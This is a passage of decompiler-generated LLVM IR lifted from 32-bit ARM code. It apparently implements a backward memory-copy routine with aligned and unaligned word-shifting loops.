  %v14_18384 = inttoptr i32 %v13_18384 to i32*
  %v15_18384 = load i32, i32* %v14_18384, align 4
  store i32 %v15_18384, i32* @ip, align 4
  %v16_18384 = add i32 %v6_18384, -16
  %v17_18384 = inttoptr i32 %v16_18384 to i32*
  %v18_18384 = load i32, i32* %v17_18384, align 4
  store i32 %v18_18384, i32* %lr.global-to-local, align 4
  store i32 %v16_18384, i32* %r1.global-to-local, align 4
  %v7_18388 = add i32 %v6_18388, -16
  %v8_18388 = inttoptr i32 %v7_18388 to i32*
  store i32 %v9_18384, i32* %v8_18388, align 4
  %v10_18388 = add i32 %v6_18388, -12
  %v11_18388 = inttoptr i32 %v10_18388 to i32*
  %v12_18388 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_18388, i32* %v11_18388, align 4
  %v13_18388 = add i32 %v6_18388, -8
  %v14_18388 = inttoptr i32 %v13_18388 to i32*
  %v15_18388 = load i32, i32* @ip, align 4
  store i32 %v15_18388, i32* %v14_18388, align 4
  %v16_18388 = add i32 %v6_18388, -4
  %v17_18388 = inttoptr i32 %v16_18388 to i32*
  %v18_18388 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_18388, i32* %v17_18388, align 4
  store i32 %v7_18388, i32* %r0.global-to-local, align 4
  %v6_1838c = load i32, i32* %r2.global-to-local, align 4
  %v7_1838c = add i32 %v6_1838c, -16
  store i32 %v7_1838c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18380, %bb147
  %v6_18398 = phi i32 [ %v7_18388, %bb147 ], [ %v6_18388, %dec_label_pc_18380 ]
  %v0_18390 = phi i32 [ %v7_1838c, %bb147 ], [ %v0_18390.pr, %dec_label_pc_18380 ]
  %v4_18390 = add i32 %v0_18390, 20
  store i32 %v4_18390, i32* %r2.global-to-local, align 4
  %v6_18390 = sub i32 0, %v0_18390
  %v7_18390 = and i32 %v4_18390, %v6_18390
  %v8_18390 = icmp slt i32 %v7_18390, 0
  store i1 %v8_18390, i1* %cpsr_v.global-to-local, align 1
  %v9_18390 = icmp slt i32 %v4_18390, 0
  store i1 %v9_18390, i1* %cpsr_n.global-to-local, align 1
  %v10_18390 = icmp eq i32 %v4_18390, 0
  store i1 %v10_18390, i1* %cpsr_z.global-to-local, align 1
  %v5_18394 = icmp slt i32 %v0_18390, -20
  br i1 %v5_18394, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_18394 = load i32, i32* %r1.global-to-local, align 4
  %v7_18394 = add i32 %v6_18394, -4
  %v8_18394 = inttoptr i32 %v7_18394 to i32*
  %v9_18394 = load i32, i32* %v8_18394, align 4
  store i32 %v9_18394, i32* @r3, align 4
  %v10_18394 = add i32 %v6_18394, -8
  %v11_18394 = inttoptr i32 %v10_18394 to i32*
  %v12_18394 = load i32, i32* %v11_18394, align 4
  store i32 %v12_18394, i32* @ip, align 4
  %v13_18394 = add i32 %v6_18394, -12
  %v14_18394 = inttoptr i32 %v13_18394 to i32*
  %v15_18394 = load i32, i32* %v14_18394, align 4
  store i32 %v15_18394, i32* %lr.global-to-local, align 4
  store i32 %v13_18394, i32* %r1.global-to-local, align 4
  %v7_18398 = add i32 %v6_18398, -12
  %v8_18398 = inttoptr i32 %v7_18398 to i32*
  store i32 %v9_18394, i32* %v8_18398, align 4
  %v10_18398 = add i32 %v6_18398, -8
  %v11_18398 = inttoptr i32 %v10_18398 to i32*
  %v12_18398 = load i32, i32* @ip, align 4
  store i32 %v12_18398, i32* %v11_18398, align 4
  %v13_18398 = add i32 %v6_18398, -4
  %v14_18398 = inttoptr i32 %v13_18398 to i32*
  %v15_18398 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_18398, i32* %v14_18398, align 4
  store i32 %v7_18398, i32* %r0.global-to-local, align 4
  %v6_1839c = load i32, i32* %r2.global-to-local, align 4
  %v7_1839c = add i32 %v6_1839c, -12
  store i32 %v7_1839c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_183bc45 = phi i32 [ %v6_18398, %.thread2 ], [ %v7_18398, %bb148 ]
  %v0_183a443 = phi i32 [ %v4_18390, %.thread2 ], [ %v7_1839c, %bb148 ]
  %v2_183a0 = load i8*, i8** %stack_var_-8, align 4
  %v3_183a0 = ptrtoint i8* %v2_183a0 to i32
  store i32 %v3_183a0, i32* @r4, align 4
  store i32 %v8_1835c, i32* @lr, align 4
  br label %dec_label_pc_183a4

dec_label_pc_183a4:                               ; preds = %dec_label_pc_18354, %.thread4
  %v7_183b4 = phi i32 [ %v0_1836c37, %dec_label_pc_18354 ], [ %v6_183bc45, %.thread4 ]
  %v0_183a4 = phi i32 [ %v2_18354, %dec_label_pc_18354 ], [ %v0_183a443, %.thread4 ]
  %v2_183a4 = add i32 %v0_183a4, 8
  store i32 %v2_183a4, i32* %r2.global-to-local, align 4
  %v4_183a4 = sub i32 0, %v0_183a4
  %v5_183a4 = and i32 %v2_183a4, %v4_183a4
  %v6_183a4 = icmp slt i32 %v5_183a4, 0
  store i1 %v6_183a4, i1* %cpsr_v.global-to-local, align 1
  %v7_183a4 = icmp slt i32 %v2_183a4, 0
  store i1 %v7_183a4, i1* %cpsr_n.global-to-local, align 1
  %v8_183a4 = icmp eq i32 %v2_183a4, 0
  store i1 %v8_183a4, i1* %cpsr_z.global-to-local, align 1
  %v5_183a8 = icmp slt i32 %v0_183a4, -8
  br i1 %v5_183a8, label %bb150, label %dec_label_pc_183ac

dec_label_pc_183ac:                               ; preds = %dec_label_pc_183a4
  %v6_183ac = add i32 %v0_183a4, 4
  store i32 %v6_183ac, i32* %r2.global-to-local, align 4
  %v8_183ac = sub i32 -5, %v0_183a4
  %v9_183ac = and i32 %v8_183ac, %v2_183a4
  %v10_183ac = icmp slt i32 %v9_183ac, 0
  store i1 %v10_183ac, i1* %cpsr_v.global-to-local, align 1
  %v11_183ac = icmp slt i32 %v6_183ac, 0
  store i1 %v11_183ac, i1* %cpsr_n.global-to-local, align 1
  %v12_183ac = icmp eq i32 %v2_183a4, 4
  store i1 %v12_183ac, i1* %cpsr_z.global-to-local, align 1
  %v5_183b0 = icmp slt i32 %v2_183a4, 4
  %v6_183b0 = load i32, i32* %r1.global-to-local, align 4
  %v7_183b0 = add i32 %v6_183b0, -4
  %v8_183b0 = inttoptr i32 %v7_183b0 to i32*
  %v9_183b0 = load i32, i32* %v8_183b0, align 4
  store i32 %v9_183b0, i32* @r3, align 4
  br i1 %v5_183b0, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_183ac
  store i32 %v7_183b0, i32* %r1.global-to-local, align 4
  %v8_183b4 = add i32 %v7_183b4, -4
  %v9_183b4 = inttoptr i32 %v8_183b4 to i32*
  store i32 %v9_183b0, i32* %v9_183b4, align 4
  %v10_183b4 = load i32, i32* %r0.global-to-local, align 4
  %v11_183b4 = add i32 %v10_183b4, -4
  store i32 %v11_183b4, i32* %r0.global-to-local, align 4
  %v0_183c4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_183ac
  %v10_183b8 = add i32 %v6_183b0, -8
  %v11_183b8 = inttoptr i32 %v10_183b8 to i32*
  %v12_183b8 = load i32, i32* %v11_183b8, align 4
  store i32 %v12_183b8, i32* @ip, align 4
  store i32 %v10_183b8, i32* %r1.global-to-local, align 4
  %v7_183bc = add i32 %v7_183b4, -8
  %v8_183bc = inttoptr i32 %v7_183bc to i32*
  store i32 %v9_183b0, i32* %v8_183bc, align 4
  %v10_183bc = add i32 %v7_183b4, -4
  %v11_183bc = inttoptr i32 %v10_183bc to i32*
  %v12_183bc = load i32, i32* @ip, align 4
  store i32 %v12_183bc, i32* %v11_183bc, align 4
  store i32 %v7_183bc, i32* %r0.global-to-local, align 4
  %v6_183c0 = load i32, i32* %r2.global-to-local, align 4
  %v7_183c0 = add i32 %v6_183c0, -4
  store i32 %v7_183c0, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_183a4, %dec_label_pc_18334, %dec_label_pc_18568, %dec_label_pc_184fc, %dec_label_pc_18490, %bb149
  %v2_183c8 = phi i32 [ %v11_183b4, %.thread8 ], [ %v0_1846020, %.thread14 ], [ %v7_183b4, %dec_label_pc_183a4 ], [ %v2_18338, %dec_label_pc_18334 ], [ %v2_183d453, %dec_label_pc_18568 ], [ %v2_183d452, %dec_label_pc_184fc ], [ %v2_183d451, %dec_label_pc_18490 ], [ %v7_183bc, %bb149 ]
  %v0_183c4 = phi i32 [ %v0_183c4.pre, %.thread8 ], [ %v2_18408, %.thread14 ], [ %v2_183a4, %dec_label_pc_183a4 ], [ %v2_1833c, %dec_label_pc_18334 ], [ %v0_183c449, %dec_label_pc_18568 ], [ %v0_183c448, %dec_label_pc_184fc ], [ %v0_183c447, %dec_label_pc_18490 ], [ %v7_183c0, %bb149 ]
  %v1_183c4 = add i32 %v0_183c4, 4
  store i32 %v1_183c4, i32* %r2.global-to-local, align 4
  %v3_183c4 = sub i32 0, %v0_183c4
  %v4_183c4 = and i32 %v1_183c4, %v3_183c4
  %v5_183c4 = icmp slt i32 %v4_183c4, 0
  store i1 %v5_183c4, i1* %cpsr_v.global-to-local, align 1
  %v6_183c4 = icmp slt i32 %v1_183c4, 0
  store i1 %v6_183c4, i1* %cpsr_n.global-to-local, align 1
  %v7_183c4 = icmp eq i32 %v1_183c4, 0
  store i1 %v7_183c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_183c4, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_183cc = add i32 %v0_183c4, 2
  %v3_183cc = sub i32 -3, %v0_183c4
  %v4_183cc = and i32 %v3_183cc, %v1_183c4
  %v5_183cc = icmp slt i32 %v4_183cc, 0
  store i1 %v5_183cc, i1* %cpsr_v.global-to-local, align 1
  %v6_183cc = icmp slt i32 %v1_183cc, 0
  store i1 %v6_183cc, i1* %cpsr_n.global-to-local, align 1
  %v7_183cc = icmp eq i32 %v1_183c4, 2
  store i1 %v7_183cc, i1* %cpsr_z.global-to-local, align 1
  %v0_183d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_183d0 = add i32 %v0_183d0, -1
  %v2_183d0 = inttoptr i32 %v1_183d0 to i8*
  %v3_183d0 = load i8, i8* %v2_183d0, align 1
  %v4_183d0 = zext i8 %v3_183d0 to i32
  store i32 %v4_183d0, i32* @r3, align 4
  store i32 %v1_183d0, i32* %r1.global-to-local, align 4
  %v3_183d4 = add i32 %v2_183c8, -1
  %v4_183d4 = inttoptr i32 %v3_183d4 to i8*
  store i8 %v3_183d0, i8* %v4_183d4, align 1
  %v5_183d4 = load i32, i32* %r0.global-to-local, align 4
  %v6_183d4 = add i32 %v5_183d4, -1
  store i32 %v6_183d4, i32* %r0.global-to-local, align 4
  %v0_183d8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_183d8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_183d8 = xor i1 %v0_183d8, %v1_183d8
  br i1 %v2_183d8, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_183d8 = load i32, i32* %r1.global-to-local, align 4
  %v4_183d8 = add i32 %v3_183d8, -1
  %v5_183d8 = inttoptr i32 %v4_183d8 to i8*
  %v6_183d8 = load i8, i8* %v5_183d8, align 1
  %v7_183d8 = zext i8 %v6_183d8 to i32
  store i32 %v7_183d8, i32* @r3, align 4
  store i32 %v4_183d8, i32* %r1.global-to-local, align 4
  %v6_183dc = add i32 %v5_183d4, -2
  %v7_183dc = inttoptr i32 %v6_183dc to i8*
  store i8 %v6_183d8, i8* %v7_183dc, align 1
  %v8_183dc = load i32, i32* %r0.global-to-local, align 4
  %v9_183dc = add i32 %v8_183dc, -1
  store i32 %v9_183dc, i32* %r0.global-to-local, align 4
  %v1_183e0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_183e0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_183e4 = phi i32 [ %v9_183dc, %bb152 ], [ %v6_183d4, %bb151 ]
  %v2_183e4 = phi i1 [ %v2_183e0.pre, %bb152 ], [ %v1_183d8, %bb151 ]
  %v1_183e4 = phi i1 [ %v1_183e0.pre, %bb152 ], [ %v0_183d8, %bb151 ]
  %v0_183e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_183e0 = xor i1 %v2_183e4, %v1_183e4
  %v4_183e0 = or i1 %v0_183e0, %v3_183e0
  br i1 %v4_183e0, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_183e0 = load i32, i32* %r1.global-to-local, align 4
  %v6_183e0 = add i32 %v5_183e0, -1
  %v7_183e0 = inttoptr i32 %v6_183e0 to i8*
  %v8_183e0 = load i8, i8* %v7_183e0, align 1
  %v9_183e0 = zext i8 %v8_183e0 to i32
  store i32 %v9_183e0, i32* @r3, align 4
  store i32 %v6_183e0, i32* %r1.global-to-local, align 4
  %v8_183e4 = add i32 %v7_183e4, -1
  %v9_183e4 = inttoptr i32 %v8_183e4 to i8*
  store i8 %v8_183e0, i8* %v9_183e4, align 1
  %v10_183e4 = load i32, i32* %r0.global-to-local, align 4
  %v11_183e4 = add i32 %v10_183e4, -1
  store i32 %v11_183e4, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_183ec:                               ; preds = %dec_label_pc_18344
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_183ec = icmp eq i32 %v1_18344, 1
  store i1 %v8_183ec, i1* %cpsr_n.global-to-local, align 1
  %v9_183ec = icmp eq i32 %v1_18344, 2
  store i1 %v9_183ec, i1* %cpsr_z.global-to-local, align 1
  %v1_183f0 = add i32 %v2_18334, -1
  %v2_183f0 = inttoptr i32 %v1_183f0 to i8*
  %v3_183f0 = load i8, i8* %v2_183f0, align 1
  %v4_183f0 = zext i8 %v3_183f0 to i32
  store i32 %v4_183f0, i32* @r3, align 4
  store i32 %v1_183f0, i32* %r1.global-to-local, align 4
  %v3_183f4 = add i32 %v2_18338, -1
  %v4_183f4 = inttoptr i32 %v3_183f4 to i8*
  store i8 %v3_183f0, i8* %v4_183f4, align 1
  %v5_183f4 = load i32, i32* %r0.global-to-local, align 4
  %v6_183f4 = add i32 %v5_183f4, -1
  store i32 %v6_183f4, i32* %r0.global-to-local, align 4
  br i1 %v8_183ec, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_183ec
  %v6_183f8 = load i32, i32* %r1.global-to-local, align 4
  %v7_183f8 = add i32 %v6_183f8, -1
  %v8_183f8 = inttoptr i32 %v7_183f8 to i8*
  %v9_183f8 = load i8, i8* %v8_183f8, align 1
  %v10_183f8 = zext i8 %v9_183f8 to i32
  store i32 %v10_183f8, i32* @r3, align 4
  store i32 %v7_183f8, i32* %r1.global-to-local, align 4
  %v9_183fc = add i32 %v5_183f4, -2
  %v10_183fc = inttoptr i32 %v9_183fc to i8*
  store i8 %v9_183f8, i8* %v10_183fc, align 1
  %v11_183fc = load i32, i32* %r0.global-to-local, align 4
  %v12_183fc = add i32 %v11_183fc, -1
  store i32 %v12_183fc, i32* %r0.global-to-local, align 4
  br i1 %v9_183ec, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_18400 = load i32, i32* %r1.global-to-local, align 4
  %v9_18400 = add i32 %v8_18400, -1
  %v10_18400 = inttoptr i32 %v9_18400 to i8*
  %v11_18400 = load i8, i8* %v10_18400, align 1
  %v12_18400 = zext i8 %v11_18400 to i32
  store i32 %v12_18400, i32* @r3, align 4
  store i32 %v9_18400, i32* %r1.global-to-local, align 4
  %v11_18404 = add i32 %v11_183fc, -2
  %v12_18404 = inttoptr i32 %v11_18404 to i8*
  store i8 %v11_18400, i8* %v12_18404, align 1
  %v13_18404 = load i32, i32* %r0.global-to-local, align 4
  %v14_18404 = add i32 %v13_18404, -1
  store i32 %v14_18404, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_183ec, %bb155
  %v0_1846020 = phi i32 [ %v12_183fc, %bb154 ], [ %v6_183f4, %dec_label_pc_183ec ], [ %v14_18404, %bb155 ]
  %v0_18408 = load i32, i32* %r2.global-to-local, align 4
  %v1_18408 = load i32, i32* @ip, align 4
  %v2_18408 = sub i32 %v0_18408, %v1_18408
  store i32 %v2_18408, i32* %r2.global-to-local, align 4
  %v4_18408 = xor i32 %v1_18408, %v0_18408
  %v5_18408 = xor i32 %v2_18408, %v0_18408
  %v6_18408 = and i32 %v5_18408, %v4_18408
  %v7_18408 = icmp slt i32 %v6_18408, 0
  store i1 %v7_18408, i1* %cpsr_v.global-to-local, align 1
  %v8_18408 = icmp slt i32 %v2_18408, 0
  store i1 %v8_18408, i1* %cpsr_n.global-to-local, align 1
  %v9_18408 = icmp eq i32 %v0_18408, %v1_18408
  store i1 %v9_18408, i1* %cpsr_z.global-to-local, align 1
  %v5_1840c = icmp slt i32 %v0_18408, %v1_18408
  br i1 %v5_1840c, label %bb150, label %dec_label_pc_18410

dec_label_pc_18410:                               ; preds = %.thread14
  %v0_18410 = load i32, i32* %r1.global-to-local, align 4
  %v1_18410 = urem i32 %v0_18410, 4
  store i32 %v1_18410, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18410 = icmp eq i32 %v1_18410, 0
  store i1 %v2_18410, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18410, label %dec_label_pc_18354, label %dec_label_pc_18418

dec_label_pc_18418:                               ; preds = %dec_label_pc_1834c, %dec_label_pc_18410
  %v0_1846019 = phi i32 [ %v2_18338, %dec_label_pc_1834c ], [ %v0_1846020, %dec_label_pc_18410 ]
  %v0_1850c = phi i32 [ %v2_1833c, %dec_label_pc_1834c ], [ %v2_18408, %dec_label_pc_18410 ]
  %v0_18418 = phi i32 [ %v2_18334, %dec_label_pc_1834c ], [ %v0_18410, %dec_label_pc_18410 ]
  %v0_18420 = phi i32 [ %v1_1834c, %dec_label_pc_1834c ], [ %v1_18410, %dec_label_pc_18410 ]
  %v1_18418 = and i32 %v0_18418, -4
  store i32 %v1_18418, i32* %r1.global-to-local, align 4
  %v1_1841c = inttoptr i32 %v1_18418 to i32*
  %v2_1841c = load i32, i32* %v1_1841c, align 4
  store i32 %v2_1841c, i32* @r3, align 4
  %v7_18420 = icmp ult i32 %v0_18420, 2
  %v2_18504 = add i32 %v0_1850c, -12
  %v4_18504 = sub i32 11, %v0_1850c
  %v5_18504 = and i32 %v4_18504, %v0_1850c
  %v6_18504 = icmp slt i32 %v5_18504, 0
  store i1 %v6_18504, i1* %cpsr_v.global-to-local, align 1
  %v7_18504 = icmp slt i32 %v2_18504, 0
  store i1 %v7_18504, i1* %cpsr_n.global-to-local, align 1
  %v8_18504 = icmp eq i32 %v0_1850c, 12
  store i1 %v8_18504, i1* %cpsr_z.global-to-local, align 1
  %v5_18508 = icmp slt i32 %v0_1850c, 12
  br i1 %v7_18420, label %dec_label_pc_18504, label %dec_label_pc_18428

dec_label_pc_18428:                               ; preds = %dec_label_pc_18418
  %v8_18420 = icmp eq i32 %v0_18420, 2
  br i1 %v8_18420, label %dec_label_pc_18498, label %dec_label_pc_1842c

dec_label_pc_1842c:                               ; preds = %dec_label_pc_18428
  br i1 %v5_18508, label %dec_label_pc_18478, label %dec_label_pc_18434

dec_label_pc_18434:                               ; preds = %dec_label_pc_1842c
  store i32 %v2_18504, i32* %r2.global-to-local, align 4
  %v3_18438 = load i32, i32* @r4, align 4
  store i32 %v3_18438, i32* %stack_var_-12, align 4
  %v6_18438 = load i32, i32* @r5, align 4
  %v8_18438 = inttoptr i32 %v6_18438 to i8*
  store i8* %v8_18438, i8** %stack_var_-8, align 4
  %v11_18438 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1843c

dec_label_pc_1843c:                               ; preds = %dec_label_pc_1843c.dec_label_pc_1843c_crit_edge, %dec_label_pc_18434
  %v0_18460 = phi i32 [ %v1_18460, %dec_label_pc_1843c.dec_label_pc_1843c_crit_edge ], [ %v0_1846019, %dec_label_pc_18434 ]
  %v0_18440 = phi i32 [ %v0_18440.pre, %dec_label_pc_1843c.dec_label_pc_1843c_crit_edge ], [ %v1_18418, %dec_label_pc_18434 ]
  %v0_1843c = phi i32 [ %v0_1843c.pre, %dec_label_pc_1843c.dec_label_pc_1843c_crit_edge ], [ %v2_1841c, %dec_label_pc_18434 ]
  %v3_1843c = mul i32 %v0_1843c, 256
  store i32 %v3_1843c, i32* %lr.global-to-local, align 4
  %v1_18440 = add i32 %v0_18440, -4
  %v2_18440 = inttoptr i32 %v1_18440 to i32*
  %v3_18440 = load i32, i32* %v2_18440, align 4
  store i32 %v3_18440, i32* @r3, align 4
  %v4_18440 = add i32 %v0_18440, -8
  %v5_18440 = inttoptr i32 %v4_18440 to i32*
  %v6_18440 = load i32, i32* %v5_18440, align 4
  store i32 %v6_18440, i32* %r4.global-to-local, align 4
  %v7_18440 = add i32 %v0_18440, -12
  %v8_18440 = inttoptr i32 %v7_18440 to i32*
  %v9_18440 = load i32, i32* %v8_18440, align 4
  store i32 %v9_18440, i32* %r5.global-to-local, align 4
  %v10_18440 = add i32 %v0_18440, -16
  %v11_18440 = inttoptr i32 %v10_18440 to i32*
  %v12_18440 = load i32, i32* %v11_18440, align 4
  store i32 %v10_18440, i32* %r1.global-to-local, align 4
  %v4_18444 = udiv i32 %v12_18440, 16777216
  %v5_18444 = or i32 %v4_18444, %v3_1843c
  store i32 %v5_18444, i32* %lr.global-to-local, align 4
  %v3_18448 = mul i32 %v12_18440, 256
  %v4_1844c = udiv i32 %v9_18440, 16777216
  %v5_1844c = or i32 %v3_18448, %v4_1844c
  store i32 %v5_1844c, i32* @ip, align 4
  %v3_18450 = mul i32 %v9_18440, 256
  %v4_18454 = udiv i32 %v6_18440, 16777216
  %v5_18454 = or i32 %v3_18450, %v4_18454
  store i32 %v5_18454, i32* %r5.global-to-local, align 4
  %v3_18458 = mul i32 %v6_18440, 256
  %v4_1845c = udiv i32 %v3_18440, 16777216
  %v5_1845c = or i32 %v3_18458, %v4_1845c
  store i32 %v5_1845c, i32* %r4.global-to-local, align 4
  %v1_18460 = add i32 %v0_18460, -16
  %v2_18460 = inttoptr i32 %v1_18460 to i32*
  store i32 %v5_1845c, i32* %v2_18460, align 4
  %v4_18460 = add i32 %v0_18460, -12
  %v5_18460 = inttoptr i32 %v4_18460 to i32*
  %v6_18460 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_18460, i32* %v5_18460, align 4
  %v7_18460 = add i32 %v0_18460, -8
  %v8_18460 = inttoptr i32 %v7_18460 to i32*
  %v9_18460 = load i32, i32* @ip, align 4
  store i32 %v9_18460, i32* %v8_18460, align 4
  %v10_18460 = add i32 %v0_18460, -4
  %v11_18460 = inttoptr i32 %v10_18460 to i32*
  %v12_18460 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18460, i32* %v11_18460, align 4
  store i32 %v1_18460, i32* %r0.global-to-local, align 4
  %v0_18464 = load i32, i32* %r2.global-to-local, align 4
  %v2_18464 = add i32 %v0_18464, -16
  store i32 %v2_18464, i32* %r2.global-to-local, align 4
  %v6_18468 = icmp slt i32 %v0_18464, 16
  br i1 %v6_18468, label %dec_label_pc_1846c, label %dec_label_pc_1843c.dec_label_pc_1843c_crit_edge

dec_label_pc_1843c.dec_label_pc_1843c_crit_edge:  ; preds = %dec_label_pc_1843c
  %v0_1843c.pre = load i32, i32* @r3, align 4
  %v0_18440.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1843c

dec_label_pc_1846c:                               ; preds = %dec_label_pc_1843c
  %v2_1846c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1846c, i32* @r4, align 4
  %v5_1846c = load i8*, i8** %stack_var_-8, align 4
  %v6_1846c = ptrtoint i8* %v5_1846c to i32
  store i32 %v6_1846c, i32* @r5, align 4
  store i32 %v11_18438, i32* @lr, align 4
  %v2_18470 = add i32 %v0_18464, -4
  store i32 %v2_18470, i32* %r2.global-to-local, align 4
  %v4_18470 = add i32 %v0_18464, 2147483632
  %v5_18470 = and i32 %v2_18470, %v4_18470
  %v6_18470 = icmp slt i32 %v5_18470, 0
  store i1 %v6_18470, i1* %cpsr_v.global-to-local, align 1
  %v7_18470 = icmp slt i32 %v2_18470, 0
  store i1 %v7_18470, i1* %cpsr_n.global-to-local, align 1
  %v8_18470 = icmp eq i32 %v2_18470, 0
  store i1 %v8_18470, i1* %cpsr_z.global-to-local, align 1
  %v5_18474 = icmp slt i32 %v2_18464, -12
  br i1 %v5_18474, label %dec_label_pc_18490, label %dec_label_pc_18478

dec_label_pc_18478:                               ; preds = %dec_label_pc_1846c, %dec_label_pc_1842c, %dec_label_pc_18478
  %v1_18484 = phi i32 [ %v5_18484, %dec_label_pc_18478 ], [ %v1_18460, %dec_label_pc_1846c ], [ %v0_1846019, %dec_label_pc_1842c ]
  %v0_18478 = load i32, i32* @r3, align 4
  %v3_18478 = mul i32 %v0_18478, 256
  store i32 %v3_18478, i32* %ip.global-to-local, align 4
  %v0_1847c = load i32, i32* %r1.global-to-local, align 4
  %v1_1847c = add i32 %v0_1847c, -4
  %v2_1847c = inttoptr i32 %v1_1847c to i32*
  %v3_1847c = load i32, i32* %v2_1847c, align 4
  store i32 %v3_1847c, i32* @r3, align 4
  store i32 %v1_1847c, i32* %r1.global-to-local, align 4
  %v4_18480 = udiv i32 %v3_1847c, 16777216
  %v5_18480 = or i32 %v4_18480, %v3_18478
  store i32 %v5_18480, i32* @ip, align 4
  %v2_18484 = add i32 %v1_18484, -4
  %v3_18484 = inttoptr i32 %v2_18484 to i32*
  store i32 %v5_18480, i32* %v3_18484, align 4
  %v4_18484 = load i32, i32* %r0.global-to-local, align 4
  %v5_18484 = add i32 %v4_18484, -4
  store i32 %v5_18484, i32* %r0.global-to-local, align 4
  %v0_18488 = load i32, i32* %r2.global-to-local, align 4
  %v2_18488 = add i32 %v0_18488, -4
  store i32 %v2_18488, i32* %r2.global-to-local, align 4
  %v6_1848c = icmp slt i32 %v0_18488, 4
  br i1 %v6_1848c, label %dec_label_pc_18490.loopexit, label %dec_label_pc_18478

dec_label_pc_18490.loopexit:                      ; preds = %dec_label_pc_18478
  %v4_18488 = sub i32 3, %v0_18488
  %v5_18488 = and i32 %v4_18488, %v0_18488
  %v6_18488 = icmp slt i32 %v5_18488, 0
  %v7_18488 = icmp slt i32 %v2_18488, 0
  store i1 %v6_18488, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18488, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18490

dec_label_pc_18490:                               ; preds = %dec_label_pc_18490.loopexit, %dec_label_pc_1846c
  %v2_183d451 = phi i32 [ %v5_18484, %dec_label_pc_18490.loopexit ], [ %v1_18460, %dec_label_pc_1846c ]
  %v0_183c447 = phi i32 [ %v2_18488, %dec_label_pc_18490.loopexit ], [ %v2_18470, %dec_label_pc_1846c ]
  %v0_18490 = load i32, i32* %r1.global-to-local, align 4
  %v1_18490 = add i32 %v0_18490, 3
  store i32 %v1_18490, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_18498:                               ; preds = %dec_label_pc_18428
  br i1 %v5_18508, label %dec_label_pc_184e4, label %dec_label_pc_184a0

dec_label_pc_184a0:                               ; preds = %dec_label_pc_18498
  store i32 %v2_18504, i32* %r2.global-to-local, align 4
  %v3_184a4 = load i32, i32* @r4, align 4
  store i32 %v3_184a4, i32* %stack_var_-12, align 4
  %v6_184a4 = load i32, i32* @r5, align 4
  %v8_184a4 = inttoptr i32 %v6_184a4 to i8*
  store i8* %v8_184a4, i8** %stack_var_-8, align 4
  %v11_184a4 = load i32, i32* @lr, align 4
  br label %dec_label_pc_184a8

dec_label_pc_184a8:                               ; preds = %dec_label_pc_184a8.dec_label_pc_184a8_crit_edge, %dec_label_pc_184a0
  %v0_184cc = phi i32 [ %v1_184cc, %dec_label_pc_184a8.dec_label_pc_184a8_crit_edge ], [ %v0_1846019, %dec_label_pc_184a0 ]
  %v0_184ac = phi i32 [ %v0_184ac.pre, %dec_label_pc_184a8.dec_label_pc_184a8_crit_edge ], [ %v1_18418, %dec_label_pc_184a0 ]
  %v0_184a8 = phi i32 [ %v0_184a8.pre, %dec_label_pc_184a8.dec_label_pc_184a8_crit_edge ], [ %v2_1841c, %dec_label_pc_184a0 ]
  %v3_184a8 = mul i32 %v0_184a8, 65536
  store i32 %v3_184a8, i32* %lr.global-to-local, align 4
  %v1_184ac = add i32 %v0_184ac, -4
  %v2_184ac = inttoptr i32 %v1_184ac to i32*
  %v3_184ac = load i32, i32* %v2_184ac, align 4
  store i32 %v3_184ac, i32* @r3, align 4
  %v4_184ac = add i32 %v0_184ac, -8
  %v5_184ac = inttoptr i32 %v4_184ac to i32*
  %v6_184ac = load i32, i32* %v5_184ac, align 4
  store i32 %v6_184ac, i32* %r4.global-to-local, align 4
  %v7_184ac = add i32 %v0_184ac, -12
  %v8_184ac = inttoptr i32 %v7_184ac to i32*
  %v9_184ac = load i32, i32* %v8_184ac, align 4
  store i32 %v9_184ac, i32* %r5.global-to-local, align 4
  %v10_184ac = add i32 %v0_184ac, -16
  %v11_184ac = inttoptr i32 %v10_184ac to i32*
  %v12_184ac = load i32, i32* %v11_184ac, align 4
  store i32 %v10_184ac, i32* %r1.global-to-local, align 4
  %v4_184b0 = udiv i32 %v12_184ac, 65536
  %v5_184b0 = or i32 %v4_184b0, %v3_184a8
  store i32 %v5_184b0, i32* %lr.global-to-local, align 4
